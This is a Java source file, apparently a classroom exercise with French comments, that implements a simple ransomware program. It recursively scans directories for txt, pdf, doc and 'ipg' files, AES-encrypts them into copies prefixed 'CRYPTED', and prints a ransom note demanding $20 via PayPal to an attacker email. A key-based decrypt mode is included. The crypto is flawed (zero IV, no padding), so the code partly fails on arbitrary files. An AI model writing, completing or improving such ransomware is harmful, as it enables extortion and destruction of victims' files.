/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ex4;

import java.util.HashMap;
import java.util.ArrayList;
import java.io.File;
import java.io.FilenameFilter;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import java.security.Key;
import javax.crypto.spec.SecretKeySpec;
import org.apache.commons.codec.Decoder;

/**
 *
 * @author chrysippus
 */
public class Ex4 {
  
    
    private static final String instance = "AES/CBC/PKCS5Padding";
    
    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws Exception {
        
        
        //************** Initialisation Booléen de break ***********************
        boolean exit = false;
        
        
        // ******************* Capture des options *****************************
        HashMap<String, String> progOptions = new HashMap<String, String>();
        progOptions.put("mode", "enc");
        ArrayList files = new ArrayList();
        String tempKey = "";
        
                
        for (int k = 0; k < args.length; k++){
            switch (args[k]){
                case "-r" :     if(k+1< args.length){
                                    if(args[k+1] != null && args[k+1].charAt(0) != '-'){
                                        progOptions.put("directory",args[k+1]);
                                    }
                                };
                                break;
                case "-t" :     if(k+1< args.length){
                                    if(args[k+1] != null && args[k+1].charAt(0) != '-'){
                                        if(args[k+1].equals("ipg") || args[k+1].equals("doc") || args[k+1].equals("pdf") || args[k+1].equals("txt")){
                                            files.add(args[k+1]);
                                        }
                                    }
                                };
                                break;
                case "-c" :     if(k+1< args.length){
                                    if(args[k+1] != null && args[k+1].charAt(0) != '-'){
                                        progOptions.put("email", args[k+1]);
                                    }
                                };
                                break;
                case "-k" :     if(k+16< args.length){
                                    for (int i = 1; i < 17; i++){
                                        if(args[k+i].charAt(0) == '-' || args[k+i] ==  null){
                                            exit = true;
                                            System.out.println("\n \n /!\\ Erreur\n");
                                            System.out.println("- L'argument clef : -k doit etre indiqué de la manière suivante -> -k E2 32 FC F1 91 12 91 88 B1 59 E4 E6 D6 79 A2 93");
                                            progOptions.put("key", null);
                                            break;
                                        }else{
                                            tempKey += args[k+i];
                                        }
                                    }
                                    progOptions.put("key", tempKey);
                                };
                                break;
                case "-d" :     progOptions.put("mode", "dec");
                                break;
            }
	}
        
        //******************* Traitement des options ****************************
        
        String directory = progOptions.get("directory");
        String key = progOptions.get("key");
        String email = progOptions.get("email");
        String mode = progOptions.get("mode");
        
        // Traitement du répertoire courrant
        if (directory == null){
            directory = System.getProperty("user.dir");
        }
        
        // Traitement de la clef
        if (progOptions.get("key") == null){
            int keySize;
            keySize = tempKey.length()*4;
            
            exit = true;
            System.out.println("\n \n /!\\ Erreur\n");
            System.out.println("- L'argument clef attend une clefs de 128 bits écris en hexadécimal");
            System.out.println("- La clef spécifiée est de seulement "+ keySize +"bits" );
        }
        
        //******************** Affichage des erreurs d'options *****************
        //System.out.println("***************Affichage des erreurs ***************");
        
        if (key == null){
            exit = true;
            System.out.println("\n \n /!\\ Erreur\n");
            System.out.println("- L'argument key est manquant. Veuillez l'indiquer comme suit : -k E2 32 FC F1 91 12 91 88 B1 59 E4 E6 D6 79 A2 93");
        }
        
                
        //************** Erreur Manque d'arguments *****************************
        // 8 arguments minimum
        /*if (args.length < 8){
            exit = true;
            System.out.println("- Vous devez entrer au minimum 4 arguments : -msg -op -key -mode \n");
	}*/
        
        //******************** Check exeptions *********************************
        if(exit == true){
            return;
        }
        
        //******************** Affichage des options ***************************
        System.out.println("\n**** Affichage des options ****\n");
        System.out.println("Le répertoire est : "+directory+"\nLa clef est : "+key+"\nLe mode est : "+mode+"\nLes types de fichier à traiter sont : "+files);
        if (email != null)
            System.out.println("L'email est : "+email);
        
        
        //******************** Début du traitement *****************************
        
        if(mode.equals("enc")){                                                 // Mode Encryption
            if (files.size() > 0){
                for (int i = 0; i <= files.size()-1; i++){
                    setFileToEncrypt(directory,key,(String) files.get(i));               // Appel de la fonction setFileToEncrypt pour les extensions choisies
                }
            }else{
                String[] filesArray = {"txt","pdf","ipg","doc"};
                for (int i = 0; i <= filesArray.length-1; i++){
                    setFileToEncrypt(directory,key,filesArray[i]);                       // Par défaut, appel de la fonction pour toutes les extensions par défault : txt + pdf + doc + ipg
                }
            }
            
            System.out.println( "cet ordinateur est piraté, plusieurs fichiers ont été chiffrés, une rançon de\n" +
                                "20$ doit être payée sur le compte PayPal");
            if (email != null)
                System.out.println(email);
            else
                System.out.println("hacker@gmail.com");
             
        }else if (mode.equals("dec")){                                          // Mode décryption
            String[] filesArray = {"txt","pdf","ipg","doc"};
                for (int i = 0; i <= filesArray.length-1; i++){
                    setFileToDecrypt(directory,key);                       // Par défaut, appel de la fonction pour toutes les extensions par défault : txt + pdf + doc + ipg
            }
        }
        
        
    }// FIN MAIN!
    
    
    /* Fonction setFileToEncrypt() 
    * Reçoit le répertoire : directory
    * Reçoit la clef : key
    * Reçoit l'extension de fichier : file
    *
    * Aucun retour 
    *
    * Lance la fonction de cryptage : encryption() en mode cryptage
    */
    public static void setFileToEncrypt(String directory, String key, String file) throws Exception { 
        
        
        File directories = new File(directory);                                 // Définition du répertoire
        File[] directoriesList = directories.listFiles();                       // Liste des répertoires présents
        if(directoriesList != null){                                            
            for (File directoryx : directoriesList) {
                if (directoryx.isDirectory()) {                                 // Si on trouve un nouveau répertoire on relance la fonction de manière récursive ->
                    setFileToEncrypt( directoryx.getAbsolutePath(), key, file);
                }
            }
        }
        
        File folder = new File(directory);                                      
        FilenameFilter fileFilter = new FilenameFilter() {
			public boolean accept(File dir, String name) {          // Récupération des fichiers ayant l'extension désirée
				if (name.toLowerCase().endsWith("."+file)) {               // Test de l'extension
					return true;
				} else {
					return false;
				}
			}
		};
        File[] filesList = folder.listFiles(fileFilter);                        // Liste des fichier à traiter
        
        
        if(filesList != null){                                                  // Si la liste existe
            for (File fileListx : filesList) {                                  // On parcourt les fichiers
                if (fileListx.isFile()) {
                    String fileName = fileListx.getName();                      // Nom du fichier à encrypter
                    File fileToEncrypt = new File (directory);                  // On rettrouve le fichier
                    File encryptedFile = new File(fileToEncrypt,"CRYPTED"+fileName);
                    encryption(1, key,fileListx,encryptedFile);                    // Appel de la fonction de cryptage
                } else if (fileListx.isDirectory()) {                           // Si on a toujours un dossier on relance la fonction de manière résursive
                    setFileToEncrypt(fileListx.getAbsolutePath(), key, file);
                }
            }
        }
    } // FIN setFileToEncrypt()
    
    
    
    /* Fonction setFileToDecrypt() 
    * Reçoit le répertoire : directory
    * Reçoit la clef : key
    *
    * Aucun retour 
    *
    * Lance la fonction de décryptage : encryption() en mode décryptage
    */
    public static void setFileToDecrypt(String directory, String key) throws Exception { 
        File folder = new File(directory);                                      
        File[] filesList = folder.listFiles();                                  // Liste des fichier à traiter
        
        
        if(filesList != null){                                                  // Si la liste existe
            for (File fileListx : filesList) {                                  // On parcourt les fichiers
                if (fileListx.isFile()) {
                    String fileName = fileListx.getName();                      // Nom du fichier à encrypter
                    boolean isFileEncrypted = fileName.startsWith("CRYPTED");   // Vérification que le fichier était bien un fichier crypté ->
                    if( isFileEncrypted == true ){                              // "      "        "        "       "
                        File fileToDecrypt = new File (directory);
                        File decryptedFile = new File(fileToDecrypt,"decrypted" + fileName);
                        encryption(2, key,fileListx,decryptedFile);
                    }
                } else if (fileListx.isDirectory()) {                           // Si on a toujours un dossier on relance la fonction de manière résursive
                    setFileToDecrypt(fileListx.getAbsolutePath(), key);
                }
            }
        }
    }
    
    public static void encryption(int mode,String key, File input, File output) throws Exception  {
        //System.out.println(key+input+output);
        
        
        byte[] IV = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };         // Création du vecteur d'initialisation
        IvParameterSpec IVParam = new IvParameterSpec(IV);
        
        byte[] byteKey = new byte[key.length() / 2];                            // transformation de la clef key en tableau de byte
        for (int i = 0; i < key.length(); i += 2) {
            byteKey[i / 2] = (byte) ((Character.digit(key.charAt(i), 16) << 4)
                                 + Character.digit(key.charAt(i+1), 16));
        }
        
        Key secretKey = new SecretKeySpec(byteKey, "AES");                      // Génération de la clef depuis key
        
        
        
        Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");                // Génération du chiffrement
        cipher.init(mode,secretKey,IVParam);                                    // Initialisation du chiffrement selont le mode choisi, la crée générée et le vecteur d'initialisation
        
        
        FileInputStream inputStream = new FileInputStream(input);               // Ouverture du flux d'entrée => lecture du fichier à chiffrer
        byte[] inputFileBytes = new byte[(int) input.length()];
        inputStream.read(inputFileBytes);                                       // Lecture du fichier à chiffrer 

        byte[] outputBytes = cipher.doFinal(inputFileBytes);                    // Réalisation du chiffrage : Déchiffrage

        FileOutputStream outputStream = new FileOutputStream(output);           // Ouverture du flux de sortie => écriture du fichier crypté
        outputStream.write(outputBytes);                                        // Ecriture du fichier crypté

        inputStream.close();                                                    // Fermeture des flux! ---> FIN du chiffrage
        outputStream.close();  
        
        
    }// FIN encryption()
    
    
    
}
